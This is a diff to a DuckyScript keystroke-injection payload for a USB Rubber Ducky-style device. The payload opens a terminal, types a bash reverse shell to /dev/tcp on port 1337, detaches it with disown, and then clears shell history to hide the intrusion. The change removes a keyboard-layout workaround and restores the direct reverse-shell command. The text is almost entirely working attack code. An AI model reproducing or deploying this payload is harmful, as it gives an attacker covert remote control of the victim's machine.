@@ -11,9 +11,7 @@ STRING terminal
 DELAY 500
 ENTER
 DELAY 2000
-REM STRING /bin/bash -i >& /dev/tcp/0.0.0.0/1337 0<&1 & disown
-REM For some reason (maybe keyboard layout) `&` becomes `'` and `^` becomes `&` when ducky is typing; so doing it that way.
-STRING /bin/bash -i >^ /dev/tcp/0.0.0.0/1337 0<^1 ^ disown
+STRING /bin/bash -i >& /dev/tcp/0.0.0.0/1337 0<&1 & disown
 ENTER
 DELAY 500
 REM Clear history
